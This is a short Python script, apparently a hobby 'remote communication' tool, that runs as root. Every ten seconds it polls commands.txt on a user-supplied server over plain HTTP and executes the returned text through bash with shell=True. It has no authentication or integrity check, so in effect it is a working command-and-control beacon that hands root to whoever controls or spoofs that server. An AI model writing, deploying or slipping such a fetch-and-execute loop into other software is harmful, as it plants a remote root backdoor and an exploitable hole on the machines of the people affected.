import os
import subprocess
import sys
import requests
import time

def bashc(cmd): #function which will execute a bash command.
    subprocess.Popen(cmd, shell=True, executable='/bin/bash')

def help(): #display the help menu if the arguments are incorrect
	print("This tool uses the apache2 webserver to communicate with a device through the network.") 
	print("It is in plain text and one way. Super simple code and not the most secure.")
	print("Usage: ", sys.argv[0], " [IP of the server] [Port]")
	sys.exit(0)

if __name__ == '__main__':
	if os.geteuid() != 0: #perform a user check to see if the script is run as root.
    		exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

	if '-h' in sys.argv or '--help' in sys.argv or len(sys.argv) != 3:
		help()

	ip = str(sys.argv[1])
	port = str(sys.argv[2])
	completeAddr = ip + ":" + port
	print("Server to listen from: ", completeAddr)
	previousCommand = ""

	print("DEBUG: Grabbing raw data from address every ten seconds.")
	
	bashc('touch log.txt')
	with open('log.txt', 'a+') as f:
		while(True):
			time.sleep(10)
			r = requests.get('http://' + completeAddr + '/commands.txt')

			if r.text == previousCommand:
				print('Command has not changed. Skipping.')
				continue

			previousCommand = r.text

			f.write(r.text+'\n')
			print('Command grabbed: ', r.text)
			print('Now executing command.')
			bashc(r.text)
